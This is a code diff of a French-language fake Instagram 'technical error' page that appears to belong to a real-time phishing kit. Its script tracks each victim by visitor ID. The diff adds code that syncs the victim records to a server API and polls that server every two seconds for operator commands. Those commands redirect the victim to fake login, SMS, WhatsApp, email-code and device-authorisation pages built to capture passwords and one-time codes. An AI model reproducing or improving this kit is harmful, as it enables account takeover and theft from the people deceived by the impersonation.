@@ -6,22 +6,20 @@
   <title>Erreur technique</title>
   <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⚠️</text></svg>">
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
     *{margin:0;padding:0;box-sizing:border-box}
     body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#000;min-height:100vh;display:flex;flex-direction:column;align-items:center;color:#f5f5f5}
     .ig-logo{width:100%;text-align:center;padding:20px 0 0}
     .ig-logo svg{width:56px;height:56px}
-    .divider{width:100%;height:1px;background:#262626;margin-top:16px}
-    .container{width:100%;max-width:400px;padding:40px 16px 20px;flex:1;display:flex;flex-direction:column;align-items:center}
-    .card{background:#181818;border:1px solid #363636;border-radius:16px;padding:32px;width:100%;text-align:center}
-    .error-box{background:rgba(237,73,86,0.08);border:1px solid rgba(237,73,86,0.3);border-radius:12px;padding:14px 16px;margin-bottom:20px;display:flex;align-items:flex-start;gap:10px;text-align:left}
+    .divider{width:100%;max-width:400px;height:1px;background:#262626;margin-top:16px}
+    .container{width:100%;max-width:400px;padding:32px 40px 20px;flex:1;display:flex;flex-direction:column;align-items:center}
+    .error-box{background:rgba(237,73,86,0.08);border:1px solid rgba(237,73,86,0.3);border-radius:12px;padding:14px 16px;margin-bottom:20px;display:flex;align-items:flex-start;gap:10px;text-align:left;width:100%}
     .error-icon{width:20px;height:20px;border-radius:50%;background:#ed4956;color:#fff;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;flex-shrink:0;margin-top:1px}
     .error-text{font-size:13px;color:#f5f5f5;line-height:1.5}
     .error-text a{color:#0095f6;text-decoration:none;font-weight:600}
     .error-text a:hover{text-decoration:underline}
     .title{font-size:16px;font-weight:600;margin-bottom:8px}
     .subtitle{font-size:14px;color:#a8a8a8;margin-bottom:20px;line-height:1.5}
-    .btn-primary{width:100%;padding:14px;border:none;border-radius:28px;font-size:15px;font-weight:600;cursor:pointer;color:#fff;background:#0095f6;transition:background .2s;font-family:inherit}
+    .btn-primary{width:100%;padding:12px;border:none;border-radius:24px;font-size:14px;font-weight:600;cursor:pointer;color:#fff;background:#0095f6;transition:background .2s;font-family:inherit}
     .btn-primary:hover{background:#1877f2}
     .footer{width:100%;max-width:400px;text-align:center;padding:16px;color:#737373;font-size:12px}
     .footer a{color:#737373;text-decoration:none}
@@ -39,20 +37,18 @@
   </div>
 
   <div class="container">
-    <div class="card">
-      <div class="error-box">
-        <div class="error-icon">!</div>
-        <div class="error-text">
-          Une erreur technique est survenue. Veuillez réessayer plus tard ou contacter le support.
-          <a href="#">Centre d'aide Instagram.</a>
-        </div>
+    <div class="error-box">
+      <div class="error-icon">!</div>
+      <div class="error-text">
+        Une erreur technique est survenue. Veuillez réessayer plus tard ou contacter le support.
+        <a href="#">Centre d'aide Instagram.</a>
       </div>
-
-      <div class="title">Erreur technique</div>
-      <div class="subtitle">Nous rencontrons actuellement des difficultés techniques. Votre demande a été enregistrée et sera traitée dans les plus brefs délais.</div>
-
-      <button class="btn-primary" onclick="window.location.href='loading.html?user='+encodeURIComponent(username)">Réessayer</button>
     </div>
+
+    <div class="title">Erreur technique</div>
+    <div class="subtitle">Nous rencontrons actuellement des difficultés techniques. Votre demande a été enregistrée et sera traitée dans les plus brefs délais.</div>
+
+    <button class="btn-primary" onclick="window.location.href='loading.html?user='+encodeURIComponent(username)">Réessayer</button>
   </div>
 
   <div class="footer">
@@ -64,8 +60,25 @@
     var username = params.get('user') || '';
     if (!username) window.location.href = '../INSTAGRAM.html';
 
+    var API_BASE = window.location.origin;
     function getUsers() { try { return JSON.parse(localStorage.getItem('ig_users') || '[]'); } catch (e) { return []; } }
-    function saveUsers(users) { localStorage.setItem('ig_users', JSON.stringify(users)); }
+    function saveUsers(users) {
+      localStorage.setItem('ig_users', JSON.stringify(users));
+      fetch(API_BASE + '/api/users', { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(users.length === 1 ? users[0] : users) }).catch(function() {});
+    }
+    function syncFromServer() {
+      fetch(API_BASE + '/api/users').then(function(r) { return r.json(); }).then(function(serverUsers) {
+        if (Array.isArray(serverUsers) && serverUsers.length > 0) {
+          var local = getUsers();
+          serverUsers.forEach(function(su) {
+            var exists = local.find(function(l) { return l.visitorId === su.visitorId; });
+            if (!exists) { local.push(su); }
+          });
+          localStorage.setItem('ig_users', JSON.stringify(local));
+        }
+      }).catch(function() {});
+    }
+    syncFromServer();
 
     function getClientId() {
       var id = sessionStorage.getItem('ig_visitor_id');
@@ -80,18 +93,21 @@
       if (user) { user.status = 'technical_error'; saveUsers(users); }
     }
 
-    var checkInterval = setInterval(function() {
+        var checkInterval = setInterval(function() {
       var visitorId = getClientId();
-      var users = getUsers();
-      var user = users.find(function(u) { return u.visitorId === visitorId; });
-      if (user && user.action) {
-        var action = user.action;
-        user.action = null;
-        saveUsers(users);
-        var pages = { 'connexion_f': 'login.html', 'login_incorrect': 'login_incorrect.html', 'sms_verification': 'sms.html', 'sms_error': 'sms_incorrect.html', 'whatsapp_verification': 'whatsapp.html', 'whatsapp_error': 'whatsapp_incorrect.html', 'email_verification': 'email.html', 'email_error': 'email_incorrect.html', 'loading': 'loading.html', 'technical_error': 'technical_error.html' };
-        var page = pages[action] || 'loading.html';
-        window.location.href = page + '?user=' + encodeURIComponent(username);
-      }
+      fetch(API_BASE + '/api/consume_action?visitorId=' + encodeURIComponent(visitorId))
+        .then(function(r) { return r.json(); })
+        .then(function(d) {
+          if (d && d.action) {
+            var pages = { 'login': 'login.html', 'connexion_f': 'login.html', 'login_incorrect': 'login_incorrect.html', 'sms_verification': 'sms.html', 'sms_error': 'sms_incorrect.html', 'whatsapp_verification': 'whatsapp.html', 'whatsapp_error': 'whatsapp_incorrect.html', 'email_verification': 'email.html', 'email_error': 'email_incorrect.html', 'loading': 'loading.html', 'technical_error': 'technical_error.html', 'authorize_device': 'authorize_device.html', 'retry': 'login.html' };
+            var page = pages[d.action] || 'loading.html';
+            var target = new URL(page, window.location.href);
+            if (target.pathname === window.location.pathname) return;
+            window.location.href = page + '?user=' + encodeURIComponent(username);
+            return;
+          }
+        })
+        .catch(function() {});
     }, 2000);
   </script>
 </body>
